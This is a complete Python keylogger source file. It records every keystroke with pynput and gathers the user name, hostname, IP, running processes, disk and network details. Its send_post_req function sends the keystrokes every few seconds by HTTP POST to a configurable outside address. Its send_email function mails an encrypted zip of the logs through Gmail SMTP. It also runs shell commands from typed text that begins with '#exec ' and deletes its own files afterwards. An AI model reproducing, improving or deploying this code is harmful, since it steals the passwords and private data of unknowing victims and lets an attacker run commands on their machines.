from pynput import keyboard
import requests
import json
import threading
import datetime
import os
import getpass
import platform
import socket
import shutil
import zipfile
import smtplib
from email.message import EmailMessage
import base64
import hashlib
import logging
import psutil
import subprocess
from cryptography.fernet import Fernet

# Global configuration
text = ""
ip_address = ""
port_number = ""
email_address = ""
email_password = ""
receiver_email = ""
command_trigger = "#exec "
time_interval = 10

# File paths
paths = {
    "log": "keylog.txt",
    "system_info": "system_info.json",
    "archive": "logs_archive.zip",
    "hash": "hash.txt",
    "process_log": "processes.txt",
    "disk_info": "disk_info.txt",
    "network_info": "network_info.txt",
    "encryption_key": "encryption.key"
}

# Setup logging
logging.basicConfig(filename="errors.log", level=logging.ERROR)

# Key management

def generate_key():
    key = Fernet.generate_key()
    with open(paths["encryption_key"], "wb") as f:
        f.write(key)
    return key

def load_key():
    return open(paths["encryption_key"], "rb").read()

# Encryption/Decryption

def encrypt_file(filepath):
    try:
        key = load_key()
        fernet = Fernet(key)
        with open(filepath, "rb") as f:
            data = f.read()
        with open(filepath, "wb") as f:
            f.write(fernet.encrypt(data))
    except Exception as e:
        logging.error(f"Encryption error: {e}")

def decrypt_file(filepath):
    try:
        key = load_key()
        fernet = Fernet(key)
        with open(filepath, "rb") as f:
            data = f.read()
        with open(filepath, "wb") as f:
            f.write(fernet.decrypt(data))
    except Exception as e:
        logging.error(f"Decryption error: {e}")

# System Info and Logging

def get_system_info():
    try:
        info = {
            "user": getpass.getuser(),
            "hostname": socket.gethostname(),
            "platform": platform.platform(),
            "processor": platform.processor(),
            "ip": socket.gethostbyname(socket.gethostname())
        }
        with open(paths["system_info"], "w", encoding="utf-8") as f:
            json.dump(info, f, indent=4)
    except Exception as e:
        logging.error(f"System info error: {e}")

def log_processes():
    try:
        with open(paths["process_log"], "w") as f:
            for proc in psutil.process_iter(['pid', 'name']):
                f.write(f"{proc.info['pid']} - {proc.info['name']}\n")
    except Exception as e:
        logging.error(f"Process logging error: {e}")

def log_disk_info():
    try:
        with open(paths["disk_info"], "w") as f:
            for part in psutil.disk_partitions():
                usage = psutil.disk_usage(part.mountpoint)
                f.write(f"{part.device}: Total={usage.total}, Used={usage.used}, Free={usage.free}\n")
    except Exception as e:
        logging.error(f"Disk info error: {e}")

def log_network_info():
    try:
        with open(paths["network_info"], "w") as f:
            addrs = psutil.net_if_addrs()
            for iface, addresses in addrs.items():
                for addr in addresses:
                    f.write(f"{iface}: {addr.address}\n")
    except Exception as e:
        logging.error(f"Network info error: {e}")

# Command Execution

def execute_command(cmd):
    try:
        return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True)
    except subprocess.CalledProcessError as e:
        logging.error(f"Command execution error: {e.output}")
        return e.output

# Keylogger Functionalities

def send_post_req():
    global text
    try:
        payload = json.dumps({"keyboardData": text})
        requests.post(f"http://{ip_address}:{port_number}", data=payload, headers={"Content-Type": "application/json"})
    except Exception as e:
        logging.error(f"POST request error: {e}")
    finally:
        threading.Timer(time_interval, send_post_req).start()

def save_to_file():
    global text
    if text:
        try:
            with open(paths["log"], "a", encoding="utf-8") as f:
                timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                f.write(f"[{timestamp}] {text}\n")
                if text.startswith(command_trigger):
                    command = text[len(command_trigger):].strip()
                    f.write(f"[Command Output] {execute_command(command)}\n")
            text = ""
        except Exception as e:
            logging.error(f"File write error: {e}")
    threading.Timer(time_interval, save_to_file).start()

def clear_log_file():
    try:
        open(paths["log"], 'w').close()
    except Exception as e:
        logging.error(f"Clear log error: {e}")

def display_log_file():
    try:
        with open(paths["log"], 'r', encoding='utf-8') as f:
            print(f.read())
    except FileNotFoundError:
        print("Log file not found.")

def archive_logs():
    try:
        with zipfile.ZipFile(paths["archive"], 'w') as zipf:
            for name in ["log", "system_info", "process_log", "disk_info", "network_info"]:
                path = paths[name]
                if os.path.exists(path):
                    encrypt_file(path)
                    zipf.write(path)
    except Exception as e:
        logging.error(f"Archive error: {e}")

def generate_log_hash():
    try:
        with open(paths["log"], 'rb') as f:
            hash_val = hashlib.sha256(f.read()).hexdigest()
        with open(paths["hash"], 'w') as hf:
            hf.write(hash_val)
    except Exception as e:
        logging.error(f"Hash error: {e}")

def check_internet():
    try:
        requests.get("http://www.google.com", timeout=5)
        return True
    except:
        return False

def send_email():
    try:
        msg = EmailMessage()
        msg['Subject'] = 'Keylogger Logs'
        msg['From'] = email_address
        msg['To'] = receiver_email
        msg.set_content("Attached are the archived logs and system information.")

        with open(paths["archive"], 'rb') as f:
            msg.add_attachment(f.read(), maintype='application', subtype='zip', filename=paths["archive"])

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
            smtp.login(email_address, email_password)
            smtp.send_message(msg)
    except Exception as e:
        logging.error(f"Email error: {e}")

def secure_cleanup():
    for name in paths:
        try:
            if os.path.exists(paths[name]):
                os.remove(paths[name])
        except Exception as e:
            logging.error(f"Cleanup error for {paths[name]}: {e}")

# Key Event Handler

def on_press(key):
    global text
    try:
        if key == keyboard.Key.enter:
            text += "\n"
        elif key == keyboard.Key.tab:
            text += "\t"
        elif key == keyboard.Key.space:
            text += " "
        elif key == keyboard.Key.backspace:
            text = text[:-1] if text else text
        elif key == keyboard.Key.esc:
            archive_logs()
            generate_log_hash()
            if check_internet():
                send_email()
            secure_cleanup()
            return False
        elif hasattr(key, 'char'):
            text += key.char
        else:
            text += str(key).strip("'")
    except Exception as e:
        logging.error(f"Key press error: {e}")

# Start Process
if __name__ == '__main__':
    generate_key()
    get_system_info()
    log_processes()
    log_disk_info()
    log_network_info()

    if check_internet():
        send_post_req()
    save_to_file()

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
